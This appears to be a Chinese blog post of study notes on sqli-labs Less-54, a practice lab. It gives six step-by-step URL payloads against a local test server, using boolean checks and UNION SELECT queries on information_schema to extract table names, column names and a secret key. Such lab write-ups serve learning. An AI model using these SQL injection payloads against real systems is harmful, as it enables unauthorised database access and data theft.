sqli-labs54-65学习笔记

发表于 2018-10-20 | 分类于 SQL注入

Less-54

这个系列是一个进阶的学习，每次注入只能尝试10次，这里的表名和密码每十次就会更换，已经知道数据库名字叫challenges，然后从表中拿到密码就成功了

  1. 首先判断注入类型，http://127.0.0.1/sqli-labs-master/Less-54/?id=1' and 1=2--+，没有回显
  2. 然后http://127.0.0.1/sqli-labs-master/Less-54/?id=1' and 1=1--+，得到正常数据，应该是字符型
  3. http://127.0.0.1/sqli-labs-master/Less-54/?id=' union select 1,2,3--+得到有回显的位置
  4. http://127.0.0.1/sqli-labs-master/Less-54/?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="challenges"--+得到表名
  5. http://127.0.0.1/sqli-labs-master/Less-54/?id=' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="kvcz5w59cl"--+得到列名
  6. http://127.0.0.1/sqli-labs-master/Less-54/?id=' union select 1,group_concat(secret_A8XX),3 from kvcz5w59cl--+得到key，然后提交过关
